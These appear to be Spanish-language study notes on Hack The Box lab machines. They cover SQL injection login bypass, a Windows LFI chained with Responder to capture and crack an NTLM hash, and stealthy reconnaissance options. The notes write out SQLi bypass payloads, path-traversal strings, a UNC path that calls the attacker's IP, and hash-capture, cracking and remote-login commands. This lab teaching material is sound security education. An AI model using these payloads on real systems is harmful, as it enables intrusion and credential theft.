**Appointment — SQL Injection en un panel de login**

La máquina expone únicamente el puerto 80 con un servidor Apache. El primer paso, como siempre, es lanzar Nmap y después examinar la web con Wappalyzer para identificar tecnologías. Hay un panel de login en PHP.

Para el fuzzing de directorios se repasan tres herramientas que hacen lo mismo con sintaxis diferente: FFUF, Feroxbuster y GoBuster. Esta última usa el parámetro dir para buscar directorios:

```
gobuster dir -u http://IP_OBJETIVO -w /ruta/al/diccionario
```

Con FFUF se puede filtrar respuestas repetidas con el parámetro -fs seguido del número de caracteres de la respuesta que se quiere ignorar, para no estar viendo el mismo error de página una y otra vez.

El panel de login es vulnerable a SQL Injection. La consulta que ejecuta el servidor por detrás tiene esta forma:

```
SELECT * FROM users WHERE username = 'admin' AND password = 'hola';
```

Si las dos condiciones se cumplen en la base de datos, el acceso se produce. Si no, el login falla. Hay dos payloads para bypasear esto:

**Método 1 — comentario:** se cierra la consulta del usuario y se comenta todo lo que viene detrás, incluyendo la validación de la contraseña:

```
admin'#
```

Cualquier cosa en el campo de contraseña queda ignorada porque el # convierte el resto de la query en comentario.

**Método 2 — OR 1 = 1:** se inyecta una condición adicional con OR que siempre es verdadera, dejando la consulta abierta:

```
admin' OR 1 igual a 1
```

La consulta resultante evalúa si el usuario es admin OR si 1=1. Como 1=1 siempre es verdad, una de las dos condiciones se cumple y el acceso se concede independientemente de la contraseña. Si en cambio se pone 1=2, la condición falsa no se cumple y el login falla, lo que confirma que el OR funciona correctamente.

La forma correcta de securizar esto es con consultas parametrizadas, donde el código SQL y los datos del usuario viajan separados. El valor introducido se trata como un dato literal y nunca puede modificar la estructura de la consulta.

- **La idea clave:** SQL Injection en login existe porque la aplicación construye la query concatenando directamente el input del usuario. No es un fallo del SQL como lenguaje, es un fallo de cómo la aplicación lo usa. Las consultas parametrizadas separan código de datos y eliminan el vector completamente
    
- **La metáfora útil:** es como si para entrar a un edificio te pidiesen decir tu nombre y lo comparasen con una lista. Si puedes modificar la lista mientras hablas, puedes añadir cualquier nombre. Las consultas parametrizadas son una lista en papel que nadie puede modificar con la voz

**Responder — LFI + captura de hash NTLM**

Esta máquina es Windows. Al poner la IP en el navegador redirige a un dominio (unika.htb). Para que Kali resuelva ese nombre internamente hay que editarlo en /etc/hosts:

```
sudo nano /etc/hosts
# Añadir al final:
IP_OBJETIVO    unika.htb
```

Este fichero es el equivalente local de un servidor DNS: asocia nombres de dominio a IPs sin necesidad de hacer ninguna consulta externa.

La URL de la web tiene un parámetro ?page= que carga ficheros del servidor. El patrón algo.php?parámetro=valor es una señal de alerta: si no está bien validado, puede permitir leer ficheros locales del servidor. Esto se llama Local File Inclusion (LFI).

Para explotar el LFI se navega hacia atrás en el árbol de directorios con ../ repetido muchas veces para asegurarse de llegar a la raíz, independientemente de en qué carpeta esté la aplicación. Como la máquina es Windows:

```
?page=../../../../../../../../Windows/System32/drivers/etc/hosts
```

Esto confirma que el LFI funciona: se puede leer el fichero de hosts del sistema remoto.

La combinación de LFI con Responder permite capturar un hash NTLM. La idea es provocar que la máquina objetivo intente conectarse a nuestra IP a través del parámetro vulnerable:

```
?page=//NUESTRA_IP/carpeta_inventada
```

La doble barra indica una ruta de red UNC (convención de Windows para acceder a recursos compartidos). Como la carpeta no existe, la máquina intenta autenticarse contra nuestra IP y en ese proceso envía el hash NTLM del usuario que ejecuta el servicio web.

Para capturarlo, Responder tiene que estar escuchando en el adaptador tun0 (la VPN de HTB) antes de que se haga la petición:

```
sudo responder -I tun0
```

Cuando llega la petición, Responder captura el hash del usuario administrador. Se guarda ese hash en un fichero y se rompe con John:

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Con el usuario y la contraseña se conecta por WinRM (puerto 5985) usando Evil-WinRM:

```
evil-winrm -i IP_OBJETIVO -u administrator -p PASSWORD
```

Desde ahí, las flags están en el escritorio del usuario correspondiente. En Windows la ruta es siempre C:\Users\USUARIO\Desktop\flag.txt, y el comando para leerla es type en lugar del cat de Linux.

- **La idea clave:** Responder funciona porque los equipos Windows, cuando intentan acceder a una carpeta compartida que no existe, pasan por un proceso de autenticación NTLM antes de saber que la ruta no existe. Ese proceso expone el hash. No hace falta que la carpeta exista, solo que el sistema lo intente
    
- **La metáfora útil:** es como si llamases al timbre de un piso que no existe en un edificio. Antes de que nadie responda, el portero ya te ha pedido el DNI. Responder es el portero

**Reconocimiento sigiloso: cuando Nmap hace demasiado ruido**

A raíz de una pregunta del grupo surge una discusión importante sobre auditorías reales. Nmap es ruidoso por diseño: envía paquetes a cada puerto para ver si responde. Un Blue Team con IDS/IPS puede detectarlo y bloquear la IP.

En escenarios donde hay que ser sigiloso (red teams, pruebas al Blue Team, caja negra estricta), hay alternativas pasivas:

- **Shodan:** base de datos pública de puertos abiertos en IPs de internet. No genera tráfico porque ya están escaneados por otros. Se consulta sin lanzar ningún paquete
    
- [**crt.sh**](http://crt.sh/) (actualmente caído): consultaba certificados TLS públicos de un dominio y revelaba subdominios sin necesidad de fuerza bruta
    
- **Escucha pasiva:** con Wireshark o tcpdump en modo promiscuo se captura el tráfico que ya circula por la red, obteniendo IPs sin emitir nada. Es lo más sigiloso posible pero también lo más lento
    
- **Route / ip route:** al conectarse a una VPN o red corporativa, el sistema añade automáticamente las rutas de red accesibles. El comando ip route o route -n en Linux (o route print en Windows) muestra los rangos de red disponibles sin enviar ningún paquete
    

El criterio para elegir entre ruido y sigilo depende del contrato: en una auditoría normal el cliente sabe que estás, puedes ser ruidoso. En un red team o cuando prueban al Blue Team, tienes que ir lo más despacio y silencioso posible, aunque eso multiplique el tiempo de la fase de reconocimiento.
